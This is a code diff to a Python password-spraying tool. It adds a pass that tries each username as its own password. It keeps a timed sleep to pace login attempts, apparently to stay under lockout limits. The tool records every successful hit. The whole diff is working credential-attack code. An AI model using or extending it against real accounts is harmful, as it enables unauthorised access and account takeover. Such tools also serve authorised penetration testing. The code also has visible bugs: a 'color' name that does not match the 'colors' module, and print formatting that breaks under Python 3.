@@ -79,9 +79,11 @@ def make_log(host):
 
 def check_sleep(login_attempts, attempts, interval):
     if login_attempts == attempts:
+        print('')
         login_attempts = 0
         colors.color_print(('[*] Sleeping until %s') % ((datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime('%M-%D %H:%M:%S')), colors.yellow)
         time.sleep(interval * 60)
+        print('')
 
 
 def main():
@@ -111,19 +113,33 @@ def main():
     if attempts:
         print('[*] Interval: Attempting %d logins per user every %d minutes') % (attempts, interval)
     print('[*] Log: %s') % (log_name)
+    print('')
 
     login_attempts = 0
 
-    for password in passwords:
-        check_sleep(login_attempts, attempts, interval)
-        print('\n')
-        print('[*] Spraying with %s') % (password)
+    # spray once with password = username if flag present
+    if equal:
+        print('[*] Spraying with password = username')
         for username in users:
-            response =target.login(username, password)
+            response = target.login(username, username)
             success = target.check_success(response)
             if success:
                 colors.color_print(('\t[+] Hit for: %s') % (username), color.green)
-                output_writer.writerow([username, password])
+                if csvfile:
+                    output_writer.writerow([username, username])
+        login_attempts += 1
+
+    # spray using password file
+    for password in passwords:
+        check_sleep(login_attempts, attempts, interval)
+        print('[*] Spraying with %s') % (password)
+        for username in users:
+            response = target.login(username, password)
+            success = target.check_success(response)
+            if success:
+                colors.color_print(('\t[+] Hit for: %s') % (username), color.green)
+                if csvfile:
+                    output_writer.writerow([username, password])
             
             # log the login attempt
             log_writer.writerow([username, datetime.date.today(), datetime.datetime.now().time().strftime('%H:%M:%S')])
